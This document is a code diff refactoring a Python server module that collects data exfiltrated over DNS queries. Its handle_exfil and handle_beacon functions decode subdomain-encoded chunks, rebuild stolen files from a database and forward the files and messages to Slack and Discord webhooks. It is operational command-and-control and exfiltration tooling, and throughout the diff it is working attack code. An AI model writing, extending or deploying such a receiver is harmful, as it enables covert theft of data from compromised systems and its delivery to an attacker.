@@ -1,4 +1,4 @@
-import os, base62
+import os, json
 from datetime import datetime, timedelta
 from dotenv import load_dotenv; load_dotenv()
 
@@ -6,21 +6,19 @@ import modules.database as db
 import modules.queries  as queries
 
 import modules.postoffice as Postoffice
-from modules.serialize import deserialize_from_header 
 
 
 # Global Variables
-SLACK_WEBHOOK   = os.getenv("SLACK_WEBHOOK")
-DISCORD_WEBHOOK = os.getenv("DISCORD_WEBHOOK")
-
-WEBHOOKS = [ SLACK_WEBHOOK, DISCORD_WEBHOOK ]
-
 # For files, use a Database. Store recent messages in RAM. 
 SEEN_SHA = {  } # SHA : file_id
 COOLDOWN = {  } # Message : timestamp
 
 
-def handle_exfil( domain : str ):
+#
+#   Interface
+#
+
+def handle_exfil( domain : str, decode_function, webhooks : list ):
     """
     Parse & Handle the exfiltrated data received from the Domain Lookup.
     Will send the result to Discord, if a Discord webhook is provided.
@@ -53,7 +51,7 @@ def handle_exfil( domain : str ):
         return
     
     if str(id_part) == "0":
-        data = deserialize_from_header(data_part)
+        data = deserialize_from_header(data_part, decode_function)
         
         filename = data["name"]
         filesize = data["size"]
@@ -87,11 +85,10 @@ def handle_exfil( domain : str ):
         
         # If they're, reconstruct the file
         chunks     = db.query_database( queries.get_filechunks, (sha_part,) )
-            
         all_chunks = "".join([(chunk[0], chunk[1])[1] for chunk in chunks])
-        numbers = base62.decode( all_chunks )
+        
             
-        file_data = numbers.to_bytes((numbers.bit_length() + 7) // 8, "big")
+        file_data = decode_function( all_chunks ) 
         file_name = db.query_database( queries.get_name_with_sha, (sha_part,) )[0][0]
             
         # Prevent duplicate send
@@ -101,7 +98,7 @@ def handle_exfil( domain : str ):
         
         # Send the reconstructed file
         file_sent = Postoffice.send(
-            WEBHOOKS,
+            webhooks,
             Postoffice.Discord_message( 
                 files   = [ (file_name, file_data) ] 
             )
@@ -122,7 +119,7 @@ def handle_exfil( domain : str ):
     return
 
 
-def handle_beacon( domain : str ):
+def handle_beacon( domain : str, decode_function, webhooks ):
     """
     Parse & Handle the beacon data received from the Domain Lookup.
     Will send the parsed message to Discord and/or Slack, depending on which webhooks are given.
@@ -141,40 +138,27 @@ def handle_beacon( domain : str ):
     
     try:
         data_part = subdomains[ 0 ]
-        message   = str(base62.decodebytes( data_part ).decode())
+        message   = decode_function( data_part ).decode()
     except IndexError:
         return
 
     except UnicodeError:
         return
 
-    send_message( message )
+    send_message( message, webhooks )
     return
 
-def handle_plaintext( domain : str ):
-    """
-    Parse & Handle the plaintext messages received from the Domain Lookup.
-    Will send the parsed message to Discord and/or Slack, depending on which webhooks are given.
-    """
-    
-    #  Domain format for Plaintext:
-    #      DATA_PART.plaintxt.example.tld
-    #  
-    #      DATA_PART (plaintext):
-    #          Should include the transferable message as is.
-    
-    # Split into subdomains. Remove Domain & TLD
-    try:
-        subdomains = domain.split(".")[0:-2]
-        message  = subdomains[ 0 ]
-    except IndexError:
-        return
-    
-    send_message( message )
-    return
+#
+#   Implementation
+#
+
+def deserialize_from_header( chunk : str, decode_function  ):
+    decoded = decode_function(chunk)
+    data = json.loads(decoded)
+    return data
 
 
-def send_message( message : str ):
+def send_message( message : str, webhooks ):
     global COOLDOWN
     
     first_appearance = True
@@ -187,7 +171,7 @@ def send_message( message : str ):
     if (datetime.now() - COOLDOWN[ message ] >= timedelta(minutes=5)) or first_appearance:
         COOLDOWN[ message ] = datetime.now()
         Postoffice.send(
-            WEBHOOKS,
+            webhooks,
             Postoffice.Slack_message( message ),
             Postoffice.Discord_message( message )
         )
